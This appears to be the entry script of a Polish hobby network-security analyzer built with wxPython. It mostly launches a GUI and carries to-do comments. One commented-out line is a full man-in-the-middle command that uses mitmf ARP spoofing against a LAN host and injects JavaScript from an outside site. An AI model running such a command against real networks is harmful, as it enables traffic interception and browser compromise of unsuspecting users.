#!/usr/bin/python
# -*- coding: utf-8 -*-
import locale,urllib2,re
import logging
locale.setlocale(locale.LC_ALL, '')
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
logging.getLogger("tshark.runtime").setLevel(logging.ERROR)

import wx
from Gui import * 

if __name__ == '__main__':
    app = wx.App()
    guiHandler = Gui(None, title='Analizator bezpieczeństwa sieci')
    app.MainLoop()
    
    
    
#ify żeby tyldy nie dopisywało
#ify żeby nie podwajało **ip**ip**ip*****ip**


#service smbd stop & service apache2 stop & killall dnsmasq &  mitmf -i eth0 --spoof --arp --target 192.168.0.113 --gateway 192.168.0.1 --inject --js-url http://haks.pl/pliki/net.js

#dodać debug
#dodać poodle

    
    














